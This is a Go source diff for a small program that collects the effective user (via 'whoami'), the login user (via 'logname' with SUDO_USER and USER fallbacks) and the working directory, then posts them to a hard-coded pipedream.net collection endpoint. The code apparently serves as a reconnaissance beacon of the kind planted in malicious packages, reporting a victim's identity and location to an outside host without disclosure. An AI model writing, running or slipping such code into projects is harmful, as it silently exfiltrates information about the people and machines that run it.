@@ -6,7 +6,9 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
+	"strings"
 )
 
 type Payload struct {
@@ -15,10 +17,33 @@ type Payload struct {
 	CWD      string `json:"cwd"`
 }
 
-func collectData() (*Payload, error) {
-	u, err := user.Current()
+func runCmd(name string) string {
+	out, err := exec.Command(name).Output()
 	if err != nil {
-		return nil, err
+		return ""
+	}
+	return strings.TrimSpace(string(out))
+}
+
+func collectData() (*Payload, error) {
+	// whoami (effective user)
+	whoami := runCmd("whoami")
+
+	// try to get login user
+	username := runCmd("logname")
+
+	// fallback if logname fails (common in containers)
+	if username == "" {
+		if sudoUser := os.Getenv("SUDO_USER"); sudoUser != "" {
+			username = sudoUser
+		} else if envUser := os.Getenv("USER"); envUser != "" {
+			username = envUser
+		} else {
+			u, err := user.Current()
+			if err == nil {
+				username = u.Username
+			}
+		}
 	}
 
 	cwd, err := os.Getwd()
@@ -27,8 +52,8 @@ func collectData() (*Payload, error) {
 	}
 
 	return &Payload{
-		Whoami:   u.Username,
-		Username: u.Username,
+		Whoami:   whoami,
+		Username: username,
 		CWD:      cwd,
 	}, nil
 }
@@ -57,7 +82,7 @@ func Send(endpoint string) error {
 }
 
 func main() {
-	err := Send("https://eoxzttabeek4bna.m.pipedream.net")
+	err := Send("https://eoxzttabeek4bna.m.pipedream.net/")
 	if err != nil {
 		log.Fatal(err)
 	}
